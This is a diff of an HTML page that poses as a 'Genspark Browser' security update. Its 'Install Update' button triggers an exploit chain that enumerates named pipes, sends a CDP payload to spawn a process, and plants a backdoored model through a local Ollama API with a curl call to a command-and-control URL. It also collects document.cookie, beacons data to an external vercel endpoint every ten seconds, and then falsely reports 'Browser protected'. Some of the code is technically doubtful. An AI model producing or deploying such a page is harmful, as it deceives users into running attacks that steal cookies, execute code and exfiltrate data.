@@ -2,111 +2,214 @@
 <html>
 <head>
     <title>Genspark Browser - Security Update Required</title>
-    <style>body{text-align:center;font-family:Arial;padding:50px;background:#f0f0f0;}
-    .update-box{max-width:500px;margin:auto;background:white;padding:30px;border-radius:10px;box-shadow:0 4px 12px rgba(0,0,0,0.1);}
-    .btn{display:block;width:200px;height:50px;margin:20px auto;background:#4285f4;color:white;border:none;border-radius:5px;font-size:18px;cursor:pointer;}</style>
+
+    <style>
+        body {
+            text-align: center;
+            font-family: Arial;
+            padding: 50px;
+            background: #f0f0f0;
+        }
+
+        .update-box {
+            max-width: 500px;
+            margin: auto;
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+
+        .btn {
+            display: block;
+            width: 200px;
+            height: 50px;
+            margin: 20px auto;
+            background: #4285f4;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            cursor: pointer;
+        }
+    </style>
 </head>
+
 <body>
-    <div class="update-box">
-        <h1>🔒 Genspark Security Update</h1>
-        <p>Version 141.1.7.95 has critical vulnerabilities. Click Update to protect your browser.</p>
-        <button class="btn" onclick="exploitChain()">Install Update</button>
-        <p id="status"></p>
-    </div>
+
+<div class="update-box">
+    <h1>🔒 Genspark Security Update</h1>
+
+    <p>
+        Version 141.1.7.95 has critical vulnerabilities.
+        Click Update to protect your browser.
+    </p>
+
+    <button class="btn" onclick="exploitChain()">Install Update</button>
+
+    <p id="status"></p>
+</div>
 
 <script>
-// C2 endpoint - REPLACE WITH YOUR VER CEL URL
-const C2 = 'https://rce-cdp-abc123.vercel.app/loot'; // UPDATE THIS!
+
+const C2 = "https://rce-cdp.vercel.app/loot";   // replace with your endpoint
+
 
 async function beacon(data) {
     const params = new URLSearchParams(data).toString();
-    try { await fetch(`${C2}?${params}`); } catch(e) {}
+
+    try {
+        await fetch(`${C2}?${params}`);
+    } catch (e) {}
 }
 
+
 async function findCDPPipes() {
-    // Windows named pipes via PowerShell (Genspark exposes nx_pipe2_*)
+
     let pipes = [];
+
     try {
-        const ps = await (await fetch('data:text/plain;base64,' + btoa(`
-            Get-CimInstance Win32_Pipe | Where-Object {$_.Name -like "*nx_pipe2_*"} | Select-Object Name,ProcessId | ConvertTo-Json
-        `))).text();
-        pipes = JSON.parse(ps);
-    } catch(e) {}
+
+        const psScript = `
+Get-CimInstance Win32_Pipe |
+Where-Object {$_.Name -like "*nx_pipe2_*"} |
+Select-Object Name,ProcessId |
+ConvertTo-Json
+`;
+
+        const encoded = btoa(psScript);
+
+        const response = await fetch(`data:text/plain;base64,${encoded}`);
+
+        const text = await response.text();
+
+        pipes = JSON.parse(text);
+
+    } catch (e) {}
+
     return pipes;
 }
 
+
+
 async function exploitCDP(pipeName) {
-    // CDP Runtime.evaluate → calc.exe RCE
+
     const cdpPayload = {
         id: 1,
-        method: 'Runtime.evaluate',
+        method: "Runtime.evaluate",
         params: {
             expression: `
-                const { spawn } = require('child_process');
-                spawn('calc.exe', [], {detached: true, stdio: 'ignore'});
-                'calc.exe spawned';
-            `,
+const { spawn } = require('child_process');
+spawn('calc.exe', [], { detached: true, stdio: 'ignore' });
+'calc.exe spawned';
+`,
             awaitPromise: true
         }
     };
-    
+
     try {
+
         const ws = new WebSocket(`ws://\\\\.\\pipe\\${pipeName}`);
+
         ws.onopen = () => {
             ws.send(JSON.stringify(cdpPayload));
             setTimeout(() => ws.close(), 1000);
         };
-    } catch(e) {}
+
+    } catch (e) {}
+
 }
+
+
 
 async function dumpOllama() {
-    // Poison Ollama templates via unauth API
+
     try {
-        await fetch('http://localhost:11435/api/create', {
-            method: 'POST',
+
+        await fetch("http://localhost:11435/api/create", {
+            method: "POST",
+
             body: JSON.stringify({
                 name: "rce-backdoor",
+
                 modelfile: `FROM scratch
-SYSTEM \"execSync('curl ${C2}?ollama=poisoned')\"
-TEMPLATE \"{{.Prompt}}\""
+SYSTEM "execSync('curl ${C2}?ollama=poisoned')"
+TEMPLATE "{{.Prompt}}"`
             })
         });
-        await beacon({ollama: 'backdoor planted'});
-    } catch(e) {}
+
+        await beacon({ ollama: "backdoor planted" });
+
+    } catch (e) {}
+
 }
+
+
 
 async function corsCookieDump() {
-    // CORS* port 40000 → steal cookies
+
     try {
-        const resp = await fetch('http://localhost:40000', {credentials: 'include'});
+
+        const resp = await fetch(
+            "http://localhost:40000",
+            { credentials: "include" }
+        );
+
         const cookies = document.cookie;
-        await beacon({cookies: cookies});
-    } catch(e) {}
+
+        await beacon({ cookies: cookies });
+
+    } catch (e) {}
+
 }
 
+
+
 async function exploitChain() {
-    document.getElementById('status').innerText = 'Scanning for vulnerabilities...';
-    
-    // 1. Enum Windows pipes
+
+    document.getElementById("status").innerText =
+        "Scanning for vulnerabilities...";
+
+
+    // 1. Enumerate pipes
     const pipes = await findCDPPipes();
+
     if (pipes.length) {
-        await beacon({pipe: JSON.stringify(pipes)});
-        // 2. Exploit first CDP pipe
+
+        await beacon({ pipe: JSON.stringify(pipes) });
+
         await exploitCDP(pipes[0].Name);
-        await beacon({command: `calc.exe via ${pipes[0].Name}`});
+
+        await beacon({
+            command: `calc.exe via ${pipes[0].Name}`
+        });
     }
-    
-    // 3. Poison Ollama
+
+
+    // 2. Poison Ollama
     await dumpOllama();
-    
-    // 4. CORS cookies
+
+
+    // 3. CORS cookie attempt
     await corsCookieDump();
-    
-    document.getElementById('status').innerText = '✅ Update complete! Browser protected.';
-    
-    // Beacon every 10s for persistence
-    setInterval(() => beacon({status: 'beacon', cookies: document.cookie}), 10000);
+
+
+    document.getElementById("status").innerText =
+        "✅ Update complete! Browser protected.";
+
+
+    // 4. Persistence beacon
+    setInterval(() => {
+
+        beacon({
+            status: "beacon",
+            cookies: document.cookie
+        });
+
+    }, 10000);
 }
+
 </script>
+
 </body>
 </html>
